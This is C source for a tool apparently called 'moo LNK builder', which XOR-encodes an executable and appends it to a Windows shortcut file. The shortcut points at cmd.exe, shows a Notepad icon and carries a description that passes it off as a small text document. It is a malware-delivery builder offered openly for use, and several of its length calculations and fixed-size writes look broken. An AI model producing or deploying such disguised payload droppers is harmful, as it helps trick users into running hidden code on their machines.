//moo LNK builder
//2023 - by gbr
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#define XOR_KEY 0xfa

const uint8_t SHELL_LINK_HEADER[] = {
    0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0xE4, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

#define HAS_NAME 0x00000004
#define HAS_ICON_LOCATION 0x00000040
#define IS_UNICODE 0x00000080
#define HAS_ARGUMENTS 0x00002000
#define HAS_EXP_STRING 0x00004000
#define PREFER_ENVIRONMENT_PATH 0x00008000

void xor_encrypt(uint8_t *data, size_t length, uint8_t key) {
    for (size_t i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

void create_lnk_file(const char *exe_path, const char *lnk_path, const char *link_description, const char *link_icon_path) {
    FILE *exe_file = fopen(exe_path, "rb");
    if (!exe_file) {
        perror("[-] couldnt find *.exe\x0d\x0a");
        return;
    }

    fseek(exe_file, 0, SEEK_END);
    long exe_size = ftell(exe_file);
    fseek(exe_file, 0, SEEK_SET);
    uint8_t *exe_data = malloc(exe_size);
    fread(exe_data, 1, exe_size, exe_file);
    fclose(exe_file);
    xor_encrypt(exe_data, exe_size, XOR_KEY);
  
    FILE *lnk_file = fopen(lnk_path, "wb");
    if (!lnk_file) {
        perror("[-] couldnt create file\x0d\x0a");
        free(exe_data);
        return;
    }

    fwrite(SHELL_LINK_HEADER, sizeof(SHELL_LINK_HEADER), 1, lnk_file);
    size_t description_length = strlen(link_description) * 2;  // Length in bytes
    fwrite(&description_length, sizeof(uint16_t), 1, lnk_file);
    fwrite(link_description, sizeof(char), strlen(link_description), lnk_file);
    fwrite("\0\0", sizeof(char), 2, lnk_file);  // Null terminator
    const char *command_line_arguments =  "/c whoami";
    size_t command_line_length = strlen(command_line_arguments) * 2;  // Length in bytes
    fwrite(&command_line_length, sizeof(uint16_t), 1, lnk_file);
    fwrite(command_line_arguments, sizeof(char), strlen(command_line_arguments), lnk_file);
    fwrite("\0\0", sizeof(char), 2, lnk_file);  // Null terminator
    size_t icon_location_length = strlen(link_icon_path) * 2;  // Length in bytes
    fwrite(&icon_location_length, sizeof(uint16_t), 1, lnk_file);
    fwrite(link_icon_path, sizeof(char), strlen(link_icon_path), lnk_file);
    fwrite("\0\0", sizeof(char), 2, lnk_file);  // Null terminator
    uint32_t block_size = 0x00000314;
    uint32_t block_signature = 0xA0000001;
    fwrite(&block_size, sizeof(uint32_t), 1, lnk_file);
    fwrite(&block_signature, sizeof(uint32_t), 1, lnk_file);
    fwrite("c:\\windows\\system32\\cmd.exe", sizeof(char), 260, lnk_file);  // szTargetAnsi
    fwrite("c:\\windows\\system32\\cmd.exe", sizeof(char), 520, lnk_file);  // wszTargetUnicode
    fwrite(exe_data, sizeof(uint8_t), exe_size, lnk_file);

    long total_lnk_file_size = ftell(lnk_file);
    printf("[+] wrote %ld bytes\x0d\x0a", total_lnk_file_size);
    fclose(lnk_file);
    free(exe_data);
    printf("[+] LNK: %s\x0d\x0a", lnk_path);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("%s <exe> <lnk>\x0d\x0a", argv[0]);
        return 1;
    }

    const char *exe_path = argv[1];
    const char *lnk_path = argv[2];
    const char *link_description = "Type: Text Document\nSize: 5.23 KB\nDate modified: 01/02/2020 11:23"; // idea from x86matthew 
    const char *link_icon_path = "c:\\windows\\system32\\notepad.exe"; //uses NotePad icon

    if (access(exe_path, F_OK) == -1) {
        printf("[-] couldnt find *.exe\x0d\x0a", exe_path);
        return 1;
    }

    create_lnk_file(exe_path, lnk_path, link_description, link_icon_path);
    return 0;
}
